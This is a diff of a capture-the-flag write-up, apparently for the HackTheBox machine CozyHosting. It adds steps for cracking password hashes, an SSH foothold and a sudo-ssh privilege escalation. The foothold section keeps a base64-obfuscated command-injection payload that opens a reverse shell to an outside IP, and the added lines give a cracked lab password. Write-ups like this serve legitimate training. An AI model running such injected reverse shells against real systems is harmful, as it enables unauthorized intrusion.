@@ -41,7 +41,7 @@ By changing the cookie we get access to a admin dashboard
 ![image](https://github.com/JefJacobs00/writeups/assets/43653885/a6313337-ef37-4f02-8702-ef2699af66e3)
 
 
-### Foothold
+## Foothold
 
 At the bottom of the admin dashbord there is a box that allowes us to connect using ssh. However this does not get us get onto the box. In burpsuite we use the payload `{echo,c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNTEvOTAwMSAwPiYx}|{base64,-d}|bash|` to get a reverse shell. 
 
@@ -51,7 +51,19 @@ We see that there is a user josh and a user prostgress that has access to the bo
 
 ![image](https://github.com/JefJacobs00/writeups/assets/43653885/8b5c8d0f-40c1-46cd-b2ee-86ac90fd4081)
 
-We put these hashes into john to find the cleartext. 
+We put these hashes into john to find the cleartext. From here we find that the admin has the password manchesterunited.
+
+![image](https://github.com/JefJacobs00/writeups/assets/43653885/c789d395-e323-49a4-a058-a045666c988f)
+
+We try to log onto the site using these credentials, this gives an error on the admin page. So we attemt to ssh josh@cozyhosting.htb with the password, this gives us the foothold!
+
+## PE
+
+For priv esc we check the sudo rights for the user, here we find that josh can use ssh with sudo. We look up if [gtfo bins](https://gtfobins.github.io/gtfobins/ssh/) has any tricks for this and they do. We copy paste the payload and get root access!
+
+![image](https://github.com/JefJacobs00/writeups/assets/43653885/22801ab9-ec5d-45ab-96cc-13c52027a1ae)
+
+
 
 
 
